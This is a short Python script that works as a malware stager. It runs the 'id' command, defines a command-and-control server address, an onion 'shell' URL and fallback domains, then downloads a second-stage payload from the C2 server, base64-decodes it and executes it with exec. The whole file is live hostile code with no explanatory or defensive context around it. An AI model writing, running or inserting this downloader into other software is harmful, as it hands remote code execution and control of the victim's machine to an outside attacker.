#!/usr/bin/env python3
import os
os.system('id')
import urllib.request, base64, time
C2 = 'http://185.220.101.45:4444'
ONION = 'http://xmh57jrknasylqs6.onion/shell'
FALLBACK = ['bvpnflkjsdhfkjshdfkjsdf.ru', 'xzfkjsdhfkjsdhfkjsd.top']
payload = urllib.request.urlopen(C2 + '/stage2.bin').read()
exec(base64.b64decode(payload))
